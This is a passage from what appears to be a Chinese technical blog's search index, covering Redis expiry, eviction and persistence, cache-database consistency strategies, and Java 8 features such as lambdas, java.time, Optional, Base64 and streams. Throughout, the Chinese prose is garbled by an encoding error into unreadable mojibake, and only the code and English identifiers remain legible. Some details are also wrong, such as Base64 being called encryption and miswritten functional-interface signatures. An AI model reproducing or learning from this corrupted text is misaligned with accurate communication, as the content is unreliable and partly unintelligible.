é™¤æ˜¯æŒ‡redisé»˜è®¤ä¼šæ¯éš”100msä¼šéšæœºæŠ½å–ä¸€äº›è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„keyæ£€æŸ¥æ˜¯å¦è¿‡æœŸäº†ï¼Œå¦‚æœè¿‡æœŸäº†å°±åˆ é™¤ã€‚\næƒ°æ€§åˆ é™¤ åœ¨ä½ å»æŸ¥keyçš„æ—¶å€™ï¼Œredisä¼šæ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªkeyæ˜¯å¦è®¾ç½®äº†è¿‡æœŸæ—¶é—´å’Œæ˜¯å¦å·²ç»è¿‡æœŸäº†ï¼Œå¦‚æœæ˜¯redisä¼šåˆ é™¤è¿™ä¸ªkeyï¼Œå¹¶ä¸”è¿”å›ç©ºã€‚\nå¦‚æœè¿‡æœŸäº†åˆæ²¡æœ‰å»æŸ¥è¿™ä¸ªkey,åƒåœ¾æ•°æ®å¤§é‡å †ç§¯ï¼ŒæŠŠredisçš„å†…å­˜è€—å°½äº†æ€ä¹ˆåŠï¼Ÿæ­¤æ—¶ä¼šè¿›è¡Œå†…å­˜æ·˜æ±°ï¼Œredisæä¾›äº†å¦‚ä¸‹ç­–ç•¥ï¼š\nnoevictionï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œæ–°å†™å…¥æ•°æ®ä¼šæŠ¥é”™ã€‚ allkeys-lruï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œä¼šç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„keyã€‚ allkeys-randomï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œä¼šéšæœºç§»é™¤æŸä¸ªkeyã€‚ volatile-lruï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œç§»é™¤æœ€è¿‘æœ€å°‘ä½¿ç”¨çš„keyã€‚ volatile-randomï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œéšæœºç§»é™¤æŸä¸ªkeyã€‚ volatile-ttlï¼šå½“å†…å­˜ä¸è¶³ä»¥å®¹çº³æ–°å†™å…¥æ•°æ®æ—¶ï¼Œåœ¨è®¾ç½®äº†è¿‡æœŸæ—¶é—´çš„é”®ç©ºé—´ä¸­ï¼Œæœ‰æ›´æ—©è¿‡æœŸæ—¶é—´çš„keyä¼˜å…ˆç§»é™¤ã€‚ redisçš„æŒä¹…åŒ–æœºåˆ¶\r#\rRDB rdbæ˜¯å…¨é‡æŒä¹…åŒ–ï¼Œæ˜¯åœ¨é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šæŒä¹…åŒ–çš„é—´éš”æ—¶é—´ï¼Œç„¶åå°†å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼Œå®é™…æ“ä½œæ˜¯forkä¸€ä¸ªå­è¿›ç¨‹ç„¶åå°†æ•°æ®é›†å†™å…¥ä¸€ä¸ªä¸´æ—¶ç£ç›˜ï¼Œå­—åè¦†ç›–æ‰ä»¥å‰çš„æ•°æ®é›†æ–‡ä»¶ã€‚\nAOF aofå¯ä»¥å¸¦æ¥æ›´é«˜çš„æ•°æ®å®‰å…¨æ€§ï¼Œaofä¸­æœ‰3ä¸­åŒæ­¥ç­–ç•¥ï¼Œï¼ˆ1.æ¯ç§’åŒæ­¥ 2.æ²¡æ‰§è¡Œä¸€ä¸ªä¿®æ”¹å‘½ä»¤å°±åŒæ­¥3.ä¸åŒæ­¥ï¼‰\nç¼“å­˜ä¸æ•°æ®åº“åŒå†™ä¸€è‡´æ€§è§£å†³æ–¹æ¡ˆ\r#\rå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†æ›´æ–°ç¼“å­˜ æ•°æ®åº“æ›´æ–°æˆåŠŸï¼Œç¼“å­˜æ›´æ–°å¤±è´¥ï¼Œå‡ºç°ç¼“å­˜ä¸æ•°æ®åº“ä¸ä¸€è‡´é—®é¢˜ã€‚\nå…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ åˆ é™¤ç¼“å­˜å¤±è´¥ä¹Ÿå‡‰å‡‰ã€‚\nå…ˆåˆ é™¤ç¼“å­˜ä¸­çš„æ•°æ®ï¼Œç„¶åå†å»æ›´æ–°æ•°æ®åº“ï¼Œæœ€åæ›´æ–°ç¼“å­˜ä¸­çš„æ•°æ® å•çº¿ç¨‹ä¸€çœ‹ï¼Œæ²¡æœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯å¤šçº¿ç¨‹æ—¶ï¼Œå°±å‡ºç°äº†é—®é¢˜ã€‚\n1-3ã€ç”¨æˆ·1è¯·æ±‚ã€æ›´æ–°æ•°æ®ã€‘ï¼Œå…ˆåˆ é™¤ç¼“å­˜æ•°æ®ï¼Œå†æ›´æ–°æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œæ­¤æ—¶è¿˜æ²¡æœ‰æ›´æ–°å®Œæˆï¼Œæ•°æ®åº“ä¸­çš„æ•°æ®è¿˜æ˜¯æ—§çš„ã€‚ 4-7ã€è¿™æ—¶ï¼Œç”¨æˆ·2è¯·æ±‚ã€è·å–æ•°æ®ã€‘ï¼Œä»ç¼“å­˜ä¸­è·å–ï¼Œç¼“å­˜ä¸­æ²¡æœ‰ï¼Œä»æ•°æ®åº“ä¸­è·å–ï¼Œè·å–åˆ°åæ›´æ–°ç¼“å­˜æ•°æ®ï¼Œæ­¤æ—¶ï¼Œç¼“å­˜ä¸­çš„æ•°æ®ä¸ºæ—§æ•°æ®ã€‚ 3ï¼Œ8ã€ç”¨æˆ·1æ¥ç€æ›´æ–°å®Œäº†æ•°æ®åº“ä¸­çš„æ•°æ®ï¼Œå†™å…¥ç¼“å­˜æ—¶å¤±è´¥äº†ã€‚\nä»¥ä¸Šçš„ä¸€ä¸ªæµç¨‹å‡ºç°äº†æ•°æ®åº“ä¸­çš„æ•°æ®ä¸ç¼“å­˜ä¸­çš„æ•°æ®ä¸ä¸€è‡´ã€‚\nè§£å†³æ–¹æ¡ˆï¼š\nï¼ˆ1ï¼‰å¦‚æœæ•°æ®åº“å’Œç¼“å­˜æ›´æ–°ä¸è¯»å–æ“ä½œè¿›è¡Œä¸²è¡ŒåŒ–ï¼Œä¸€ä¸ªé˜Ÿåˆ—å¯¹åº”ä¸€ä¸ªå·¥ä½œçº¿ç¨‹ï¼Œæ¯ä¸ªå·¥ä½œçº¿ç¨‹ä¸²è¡Œæ‹¿åˆ°å¯¹åº”çš„æ“ä½œï¼Œç„¶åä¸€æ¡ä¸€æ¡çš„æ‰§è¡Œï¼Œé‚£ä¹ˆå°±ä¸ä¼šå‡ºç°è¿™æ ·çš„é—®é¢˜ã€‚\né¦–å…ˆæˆ‘ä»¬çš„é¡¹ç›®é‡Œç»´æŠ¤ä¸€ç»„çº¿ç¨‹æ± å’Œå†…å­˜é˜Ÿåˆ—ã€‚ æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œæ ¹æ®æ•°æ®çš„å”¯ä¸€æ ‡è¯†å°†è¯·æ±‚è·¯ç”±åˆ°ä¸€ä¸ªjvmé˜Ÿåˆ—ä¸­ï¼Œå»æ›´æ–°æ•°æ®åº“,ç„¶åè¯·æ±‚ç»“æŸã€‚ è¯»å–æ•°æ®çš„æ—¶å€™ï¼Œå…ˆæŸ¥ç¼“å­˜ï¼Œå¦‚æœå‘ç°æ•°æ®ä¸åœ¨ç¼“å­˜ä¸­ï¼Œé‚£ä¹ˆå°†æ ¹æ®å”¯ä¸€æ ‡è¯†è·¯ç”±ä¹‹åï¼Œä¹Ÿå‘é€åŒä¸€ä¸ªjvmå†…éƒ¨çš„é˜Ÿåˆ—ä¸­ï¼Œé‡æ–°è¯»å–æ•°æ®åº“åæ›´æ–°ç¼“å­˜,æœ€åè¯·æ±‚ç»“æŸã€‚ ï¼ˆ2ï¼‰å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†åˆ é™¤ç¼“å­˜ï¼Œå¦‚æœåˆ é™¤å¤±è´¥é‡è¯•ã€‚\nï¼ˆ3ï¼‰å…ˆæ›´æ–°æ•°æ®åº“ï¼Œä½¿ç”¨è®¢é˜…æ•°æ®åº“log_binæ–¹å¼ï¼Œå†åˆ é™¤ç¼“å­˜ï¼Œå¦‚æœåˆ é™¤å¤±è´¥é‡è¯•ã€‚\n"},{"id":72,"href":"/posts/history/java8%E6%96%B0%E7%89%B9%E6%80%A7/","title":"Java8æ–°ç‰¹æ€§","section":"æˆ‘çš„åšå®¢","content":"\rLambdaè¡¨è¾¾å¼\r#\rLambda è¡¨è¾¾å¼çš„å¼•å…¥é¿å…äº†åŒ¿åæ–¹æ³•çš„éº»çƒ¦ä½¿ç”¨ï¼Œå¹¶ä¸”ç»™äºˆJavaç®€å•ä½†æ˜¯å¼ºå¤§çš„å‡½æ•°åŒ–çš„ç¼–ç¨‹èƒ½åŠ›ã€‚\nä½¿ç”¨\n// åœ¨1.8ä¹‹å‰ä½¿ç”¨ new Thread(new Runnable() { @Override public void run() { System.out.println(\u0026#34;Before Java8!\u0026#34;); } }).start(); // åœ¨1.8ä¹‹åä½¿ç”¨ new Thread(() -\u0026gt; System.out.println(\u0026#34;In Java8!\u0026#34;) ).start(); è¯­æ³•\nåŸºæœ¬è¯­æ³•: (parameters) -\u0026gt; expression æˆ– (parameters) -\u0026gt;{ statements; }\n// 1. ä¸éœ€è¦å‚æ•°,è¿”å›å€¼ä¸º 5 () -\u0026gt; {return 5;} () -\u0026gt; 5 // åªæœ‰ä¸€è¡Œï¼Œå¯ä»¥çœç•¥{}å’Œreturn // 2. æ¥æ”¶ä¸€ä¸ªå‚æ•°(æ•°å­—ç±»å‹),è¿”å›å…¶2å€çš„å€¼ (x) -\u0026gt; 2 * x // 3. æ¥å—2ä¸ªå‚æ•°(æ•°å­—),å¹¶è¿”å›ä»–ä»¬çš„å·®å€¼ (x, y) -\u0026gt; x â€“ y // 4. æ¥æ”¶2ä¸ªintå‹æ•´æ•°,è¿”å›ä»–ä»¬çš„å’Œ (int x, int y) -\u0026gt; x + y // 5. æ¥å—ä¸€ä¸ª string å¯¹è±¡,å¹¶åœ¨æ§åˆ¶å°æ‰“å°,ä¸è¿”å›ä»»ä½•å€¼(çœ‹èµ·æ¥åƒæ˜¯è¿”å›void) (String s) -\u0026gt; System.out.print(s) Java SE 8ä¸­å¢åŠ äº†ä¸€ä¸ªæ–°çš„åŒ…ï¼šjava.util.function\nPredicate\u0026lt;T\u0026gt; -\u0026gt; boolean test(T t); æ¥æ”¶ T å¹¶è¿”å› boolean Consumer\u0026lt;T\u0026gt; -\u0026gt; void accept(T t); æ¥æ”¶ Tï¼Œä¸è¿”å›å€¼ Function\u0026lt;T, R\u0026gt; -\u0026gt; R apply(T t); æ¥æ”¶ Tï¼Œè¿”å› R Supplier\u0026lt;T\u0026gt; -\u0026gt; T get(); æä¾› T å¯¹è±¡ï¼ˆä¾‹å¦‚å·¥å‚ï¼‰ï¼Œä¸æ¥æ”¶å€¼ UnaryOperator\u0026lt;T\u0026gt; -\u0026gt; R apply(T t); æ¥æ”¶ T å¯¹è±¡ï¼Œè¿”å› T BinaryOperator\u0026lt;T\u0026gt; -\u0026gt; R apply(T t, U u); æ¥æ”¶ä¸¤ä¸ª Tï¼Œè¿”å› T æ–°çš„æ—¥æœŸAPI\r#\r1.8ä¹‹å‰JDKè‡ªå¸¦çš„æ—¥æœŸå¤„ç†ç±»éå¸¸ä¸æ–¹ä¾¿ï¼Œè€Œé¢å¯¹è¿™ä¸€ç¼ºç‚¹ï¼Œæ–°çš„java.timeåŒ…æ¶µç›–äº†æ‰€æœ‰å¤„ç†æ—¥æœŸï¼Œæ—¶é—´ï¼Œæ—¥æœŸ/æ—¶é—´ï¼Œæ—¶åŒºï¼Œæ—¶åˆ»ï¼ˆinstantsï¼‰ï¼Œè¿‡ç¨‹ï¼ˆduringï¼‰ä¸æ—¶é’Ÿï¼ˆclockï¼‰çš„æ“ä½œã€‚\nLocalDate/LocalTime/LocalDateTime\nLocalDateä¸ºæ—¥æœŸå¤„ç†ç±» LocalTimeä¸ºæ—¶é—´å¤„ç†ç±» LocalDateTimeä¸ºæ—¥æœŸæ—¶é—´å¤„ç†ç±» LocalDateTime ldt = LocalDateTime.now(); // é€šè¿‡é™æ€æ–¹æ³•of()æ–¹æ³•å‚æ•°å¯ä»¥æŒ‡å®šå¹´æœˆæ—¥æ—¶åˆ†ç§’ LocalDateTime of = LocalDateTime.of(2018, 12, 30, 20, 20, 20); ä¸è·å–ç›¸å…³çš„æ–¹æ³•:getç³»ç±»çš„æ–¹æ³• getYear() è·å–å¹´ getMinute() è·å–åˆ†é’Ÿ getHour() è·å–å°æ—¶ getDayOfMonth è·å¾—æœˆä»½å¤©æ•°(1-31) getDayOfYear è·å¾—å¹´ä»½å¤©æ•°(1-366) getDayOfWeek è·å¾—æ˜ŸæœŸå‡ (è¿”å›ä¸€ä¸ª DayOfWeekæšä¸¾å€¼) getMonth è·å¾—æœˆä»½, è¿”å›ä¸€ä¸ª Month æšä¸¾å€¼ getMonthValue è·å¾—æœˆä»½(1-12) getYear è·å¾—å¹´ä»½ æ ¼å¼åŒ–æ—¥æœŸ DateTimeFormatter formatter = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); LocalDateTime ldt = LocalDateTime.parse(\u0026#34;2018-01-21 20:30:36\u0026#34;, formatter); String yyyy = ldt.format(DateTimeFormatter.ofPattern(\u0026#34;yyyy\u0026#34;)); åˆ¤æ–­çš„æ–¹æ³• isAfter()åˆ¤æ–­ä¸€ä¸ªæ—¥æœŸæ˜¯å¦åœ¨æŒ‡å®šæ—¥æœŸä¹‹å isBefore()åˆ¤æ–­ä¸€ä¸ªæ—¥æœŸæ˜¯å¦åœ¨æŒ‡å®šæ—¥æœŸä¹‹å‰ isEqual(); åˆ¤æ–­ä¸¤ä¸ªæ—¥æœŸæ˜¯å¦ç›¸åŒ æ·»åŠ å¹´æœˆæ—¥æ—¶åˆ†ç§’çš„æ–¹æ³• plusç³»åˆ—çš„æ–¹æ³• éƒ½ä¼šè¿”å›ä¸€ä¸ªæ–°çš„LocalDateTimeçš„å¯¹è±¡ LocalDateTime localDateTime = ldt.plusYears(1); LocalDateTime localDateTime1 = ldt.plusMonths(3); LocalDateTime localDateTime2=ldt.plusHours(10); å‡å»å¹´æœˆæ—¥æ—¶åˆ†ç§’çš„æ–¹æ³• minus ç³»åˆ—çš„æ–¹æ³• LocalDateTime localDateTime2 = ldt.minusYears(8); æŒ‡å®šå¹´æœˆæ—¥æ—¶åˆ†ç§’çš„æ–¹æ³• withç³»åˆ—çš„æ–¹æ³• LocalDateTime localDateTime3 = ldt.withYear(1998); è·å–è¿™ä¸ªæœˆçš„ç¬¬å‡ ä¸ªæ˜ŸæœŸå‡ æ˜¯å‡ å· TemporalAdjusters.dayOfWeekInMonth(2, DayOfWeek.FRIDAY) ä»£è¡¨çš„æ„æ€æ˜¯è¿™ä¸ªæœˆçš„ç¬¬äºŒä¸ªæ˜ŸæœŸäº”æ˜¯å‡ å· LocalDateTime with1 = now.with(TemporalAdjusters.dayOfWeekInMonth(2,DayOfWeek.FRIDAY)); Instant æ—¶é—´æˆ³\nInstant ins = Instant.now(); ZonedDateã€ZonedTimeã€ZonedDateTime\nå¸¦æ—¶åŒºçš„æ—¶é—´æˆ–æ—¥æœŸ // æŸ¥çœ‹java8ä¸­æ”¯æŒçš„æ—¶åŒºæœ‰å“ªäº› Set\u0026lt;String\u0026gt; zones= ZoneId.getAvailableZoneIds(); // è·å–ä¸€ä¸ªæŒ‡å®šçš„æ—¶åŒº ZoneId zoneId = ZoneId.of(\u0026#34;Asia/Shanghai\u0026#34;); LocalDateTime localDateTime = LocalDateTime.now(zoneId); ZonedDateTime zonedDateTime = localDateTime.atZone(zoneId); Durationã€Period\nDuration:ç”¨äºè®¡ç®—ä¸¤ä¸ªâ€œæ—¶é—´â€é—´éš” Period:ç”¨äºè®¡ç®—ä¸¤ä¸ªâ€œæ—¥æœŸâ€é—´éš” // æ¯”è¾ƒä¹‹åå¾—åˆ°çš„æ˜¯ä¸€ä¸ªDurationå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å¯¹è±¡ç›¸åº”çš„æ–¹æ³• Instant instant1 = Instant.now(); Instant instant2 = Instant.now(); Duration duration = Duration.between(instant1, instant2); // æ¯”è¾ƒä¹‹åå¾—åˆ°çš„æ˜¯ä¸€ä¸ªPeriodå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å¯¹è±¡ç›¸åº”çš„æ–¹æ³• LocalDate localDate = LocalDate.now(); LocalDate localDate2 = LocalDate.of(2018, 1, 12); Period period=Period.between(localDate, localDate2); TemporalAdjusters\nè¿™ä¸ªç±»åœ¨æ—¥æœŸè°ƒæ•´æ—¶éå¸¸æœ‰ç”¨ï¼Œæ¯”å¦‚å¾—åˆ°å½“æœˆçš„ç¬¬ä¸€å¤©ã€æœ€åä¸€å¤©ï¼Œå½“å¹´çš„ç¬¬ä¸€å¤©ã€æœ€åä¸€å¤©ï¼Œä¸‹ä¸€å‘¨æˆ–å‰ä¸€å‘¨çš„æŸå¤©ç­‰ LocalDate now = LocalDate.now(); LocalDate with = now.with(TemporalAdjusters.lastDayOfYear()); DateTimeFormatter\né…åˆLocalDate/LocalTime/LocalDateTimeä½¿ç”¨ï¼Œæ¯”å¦‚æƒ³æŠŠå½“å‰æ—¥æœŸæ ¼å¼åŒ–æˆyyyy-MM-dd hh:mm:ssçš„å½¢å¼ã€‚ LocalDateTime now = LocalDateTime.now(); DateTimeFormatter timeFormat = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); String time = now.format(timeFormat); DateTimeFormatter dateFormat = DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM-dd HH:mm:ss\u0026#34;); LocalDateTime parse = LocalDateTime.parse(time, timeFormat); å¼•å…¥Optional\r#\rOptional ç±»çš„å¼•å…¥æ˜¯ä¸ºäº†è§£å†³ç©ºæŒ‡é’ˆå¼‚å¸¸é—®é¢˜ï¼Œè¿™æ ·æˆ‘ä»¬å°±ä¸ç”¨æ˜¾å¼è¿›è¡Œç©ºå€¼æ£€æµ‹ã€‚\nå¸¸ç”¨æ“ä½œï¼š\nOptional.of(T t) : åˆ›å»ºä¸€ä¸ª Optional å®ä¾‹ Optional.empty() : åˆ›å»ºä¸€ä¸ªç©ºçš„ Optional å®ä¾‹ Optional.ofNullable(T t):è‹¥ t ä¸ä¸º null,åˆ›å»º Optional å®ä¾‹,å¦åˆ™åˆ›å»ºç©ºå®ä¾‹ isPresent() : åˆ¤æ–­æ˜¯å¦åŒ…å«å€¼ orElse(T t) : å¦‚æœè°ƒç”¨å¯¹è±¡åŒ…å«å€¼ï¼Œè¿”å›è¯¥å€¼ï¼Œå¦åˆ™è¿”å›t orElseGet(Supplier s) :å¦‚æœè°ƒç”¨å¯¹è±¡åŒ…å«å€¼ï¼Œè¿”å›è¯¥å€¼ï¼Œå¦åˆ™è¿”å› s è·å–çš„å€¼ map(Function f): å¦‚æœæœ‰å€¼å¯¹å…¶å¤„ç†ï¼Œå¹¶è¿”å›å¤„ç†åçš„Optionalï¼Œå¦åˆ™è¿”å›Optional.empty() flatMap(Function mapper):ä¸ map ç±»ä¼¼ï¼Œè¦æ±‚è¿”å›å€¼å¿…é¡»æ˜¯Optional ä½¿ç”¨Base64\r#\rå®ä¾‹æ–¹æ³• java.util.Base64 ç±»ä»…ç”±ç”¨äºè·å¾—Base64ç¼–ç æ–¹æ¡ˆçš„ç¼–ç å™¨å’Œè§£ç å™¨çš„é™æ€æ–¹æ³•ç»„æˆã€‚\næ–¹æ³•å æè¿° getDecoder() è¿”å›Base64.Decoderè§£ç ä½¿ç”¨Basicå‹base64ç¼–ç æ–¹æ¡ˆã€‚ getEncoder() è¿”å›ä¸€ä¸ªBase64.Encoderç¼–ç ä½¿ç”¨Basicå‹base64ç¼–ç æ–¹æ¡ˆã€‚ getMimeDecoder() è¿”å›ä¸€ä¸ªBase64.Decoderè§£ç ä½¿ç”¨MIMEå‹BASE64è§£ç æ–¹æ¡ˆã€‚ getMimeEncoder() è¿”å›ä¸€ä¸ªBase64.Encoderç¼–ç ä½¿ç”¨MIMEå‹base64ç¼–ç æ–¹æ¡ˆã€‚ getMimeEncoder(int lineLength, byte[] lineSeparator) è¿”å›ä¸€ä¸ªBase64.Encoder ï¼Œå®ƒä½¿ç”¨å…·æœ‰æŒ‡å®šè¡Œé•¿åº¦å’Œè¡Œåˆ†éš”ç¬¦çš„MIMEç±»å‹base64ç¼–ç æ–¹æ¡ˆè¿›è¡Œç¼–ç ã€‚ getUrlDecoder() è¿”å›Base64.Decoderè§£ç ä½¿ç”¨URL and Filename safeå‹base64ç¼–ç æ–¹æ¡ˆã€‚ getUrlEncoder() è¿”å›ä¸€ä¸ªBase64.Encoderç¼–ç ä½¿ç”¨URL and Filename safeå‹base64ç¼–ç æ–¹æ¡ˆã€‚ Encoder\næ–¹æ³• æè¿° byte[] encode(byte[] src) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆå°†æŒ‡å®šå­—èŠ‚æ•°ç»„ä¸­çš„æ‰€æœ‰å­—èŠ‚ç¼–ç ä¸ºæ–°åˆ†é…çš„å­—èŠ‚æ•°ç»„ã€‚ int encode(byte[] src, byte[] dst) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆå¯¹æ¥è‡ªæŒ‡å®šå­—èŠ‚æ•°ç»„çš„æ‰€æœ‰å­—èŠ‚è¿›è¡Œç¼–ç ï¼Œå°†ç”Ÿæˆçš„å­—èŠ‚å†™å…¥ç»™å®šçš„è¾“å‡ºå­—èŠ‚æ•°ç»„ï¼Œä»åç§»0å¼€å§‹ã€‚ ByteBuffer encode(ByteBuffer buffer) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆå°†æ‰€æœ‰å‰©ä½™å­—èŠ‚ä»æŒ‡å®šçš„å­—èŠ‚ç¼“å†²åŒºç¼–ç åˆ°æ–°åˆ†é…çš„ByteBufferä¸­ã€‚ String\tencodeToString(byte[] src) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆå°†æŒ‡å®šçš„å­—èŠ‚æ•°ç»„ç¼–ç ä¸ºå­—ç¬¦ä¸²ã€‚ Base64.Encoder withoutPadding() è¿”å›ä¸€ä¸ªç¼–ç å™¨å®ä¾‹ï¼Œç¼–ç å™¨ç­‰æ•ˆäºæ­¤ç¼–ç å™¨å®ä¾‹ï¼Œä½†ä¸ä¼šåœ¨ç¼–ç å­—èŠ‚æ•°æ®çš„æœ«å°¾æ·»åŠ ä»»ä½•å¡«å……å­—ç¬¦ã€‚ OutputStream wrap(OutputStream os) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆåŒ…è£…ç”¨äºç¼–ç å­—èŠ‚æ•°æ®çš„è¾“å‡ºæµã€‚ Decoder\næ–¹æ³• æè¿° byte[] decode(byte[] src) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆä»è¾“å…¥å­—èŠ‚æ•°ç»„ä¸­è§£ç æ‰€æœ‰å­—èŠ‚ï¼Œå°†ç»“æœå†™å…¥æ–°åˆ†é…çš„è¾“å‡ºå­—èŠ‚æ•°ç»„ã€‚ int decode(byte[] src, byte[] dst) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆä»è¾“å…¥å­—èŠ‚æ•°ç»„ä¸­è§£ç æ‰€æœ‰å­—èŠ‚ï¼Œå°†ç»“æœå†™å…¥ç»™å®šçš„è¾“å‡ºå­—èŠ‚æ•°ç»„ï¼Œä»åç§»0å¼€å§‹ã€‚ ByteBuffer decode(ByteBuffer buffer) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆä»è¾“å…¥å­—èŠ‚ç¼“å†²åŒºä¸­è§£ç æ‰€æœ‰å­—èŠ‚ï¼Œå°†ç»“æœå†™å…¥æ–°åˆ†é…çš„ByteBufferã€‚ byte[] decode(String src) ä½¿ç”¨Base64ç¼–ç æ–¹æ¡ˆå°†Base64ç¼–ç çš„å­—ç¬¦ä¸²è§£ç ä¸ºæ–°åˆ†é…çš„å­—èŠ‚æ•°ç»„ã€‚ InputStream wrap(InputStream is) è¿”å›ä¸€ä¸ªè¾“å…¥æµï¼Œç”¨äºè§£ç Base64ç¼–ç å­—èŠ‚æµã€‚ ç®€å•ä½¿ç”¨\nString str= \u0026#34;hello world!\u0026#34;; // åŠ å¯† String desc = Base64.getEncoder().encodeToString(str.getBytes(StandardCharsets.UTF_8)); // è§£å¯† byte[] unDecodeStr = Base64.getDecoder().decode(desc); æ¥å£çš„é»˜è®¤æ–¹æ³•\r#\råœ¨æ–¹æ³•çš„å‰é¢æ·»åŠ  default å®ç°é»˜è®¤æ¥å£çš„å®šä¹‰ã€‚\nä»¥å‰å½“éœ€è¦ä¿®æ”¹æ¥å£çš„æ—¶å€™ï¼Œéœ€è¦ä¿®æ”¹å…¨éƒ¨å®ç°è¯¥æ¥å£çš„ç±»ã€‚è€Œå¼•è¿›çš„é»˜è®¤æ–¹æ³•çš„ç›®çš„æ˜¯ä¸ºäº†è§£å†³æ¥å£çš„ä¿®æ”¹ä¸ç°æœ‰çš„å®ç°ä¸å…¼å®¹çš„é—®é¢˜ã€‚\næ–¹æ³•å¼•ç”¨\r#\ræ–¹æ³•å¼•ç”¨æ˜¯ç”¨æ¥ç›´æ¥è®¿é—®ç±»æˆ–è€…å®ä¾‹çš„å·²ç»å­˜åœ¨çš„æ–¹æ³•æˆ–è€…æ„é€ æ–¹æ³•ã€‚æ–¹æ³•å¼•ç”¨æ˜¯ä¸€ä¸ªLambdaè¡¨è¾¾å¼ï¼Œå…¶ä¸­æ–¹æ³•å¼•ç”¨çš„æ“ä½œç¬¦æ˜¯åŒå†’å·\u0026quot;::\u0026quot;ã€‚\nç±»å::é™æ€æ–¹æ³•å å¯¹è±¡::å®ä¾‹æ–¹æ³•å å¯¹è±¡çš„è¶…ç±»æ–¹æ³•å¼•ç”¨è¯­æ³•ï¼š super::MethodName ç±»æ„é€ å™¨å¼•ç”¨è¯­æ³•ï¼š ClassName::new ä¾‹å¦‚ï¼šArrayList::new æ•°ç»„æ„é€ å™¨å¼•ç”¨è¯­æ³•ï¼š TypeName[]::new ä¾‹å¦‚ï¼š String[]:new ç±»å::å®ä¾‹æ–¹æ³•å Stream/ParallelStream ç±»\r#\rJava 8 APIæ·»åŠ äº†ä¸€ä¸ªæ–°çš„æŠ½è±¡ç§°ä¸ºæµStreamï¼ŒæŠŠçœŸæ­£çš„å‡½æ•°å¼ç¼–ç¨‹é£æ ¼å¼•å…¥åˆ°Javaä¸­ï¼Œå¯ä»¥è®©ä½ ä»¥ä¸€ç§å£°æ˜çš„æ–¹å¼å¤„ç†æ•°æ®ã€‚\nStream/ParallelStream æ˜¯å¯¹é›†åˆçš„åŒ…è£…,é€šå¸¸å’Œlambdaä¸€èµ·ä½¿ç”¨ã€‚ ä½¿ç”¨lambdaså¯ä»¥æ”¯æŒè®¸å¤šæ“ä½œ,å¦‚ map, filter, limit, sorted, count, min, max, sum, collect ç­‰ç­‰ã€‚å…¶ä¸­ParallelStream å¹¶è¡Œæµæ˜¯å¹¶è¡Œæ‰§è¡Œçº¿ç¨‹ä¸å®‰å…¨çš„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯æ— åºçš„ã€‚\næµçš„ç”Ÿæˆæ–¹æ³•\nCollectionæ¥å£çš„stream()æˆ–parallelStream()æ–¹æ³• é™æ€çš„Stream.of()ã€Stream.empty()æ–¹æ³• Arrays.stream(array, from, to) é™æ€çš„Stream.generate()æ–¹æ³•ç”Ÿæˆæ— é™æµï¼Œæ¥å—ä¸€ä¸ªä¸åŒ…å«å¼•å…ƒçš„å‡½æ•° é™æ€çš„Stream.iterate()æ–¹æ³•ç”Ÿæˆæ— é™æµï¼Œæ¥å—ä¸€ä¸ªç§å­å€¼ä»¥åŠä¸€ä¸ªè¿­ä»£å‡½æ•° Patternæ¥å£çš„splitAsStream(input)æ–¹æ³• é™æ€çš„Files.lines(path)ã€Files.lines(path, charSet)æ–¹æ³• é™æ€çš„Stream.concat()æ–¹æ³•å°†ä¸¤ä¸ªæµè¿æ¥èµ·æ¥ æµçš„Intermediateæ–¹æ³•(ä¸­é—´æ“ä½œ)\nfilter(Predicate) ï¼šå°†ç»“æœä¸ºfalseçš„å…ƒç´ è¿‡æ»¤æ‰ map(fun) ï¼šè½¬æ¢å…ƒç´ çš„å€¼ï¼Œå¯ä»¥ç”¨æ–¹æ³•å¼•å…ƒæˆ–è€…lambdaè¡¨è¾¾å¼ flatMap(fun) ï¼šè‹¥å…ƒç´ æ˜¯æµï¼Œå°†æµæ‘Šå¹³ä¸ºæ­£å¸¸å…ƒç´ ï¼Œå†è¿›è¡Œå…ƒç´ è½¬æ¢ limit(n) ï¼šä¿ç•™å‰nä¸ªå…ƒç´  skip(n) ï¼šè·³è¿‡å‰nä¸ªå…ƒç´  distinct() ï¼šå‰”é™¤é‡å¤å…ƒç´  sorted() ï¼šå°†Comparableå…ƒç´ 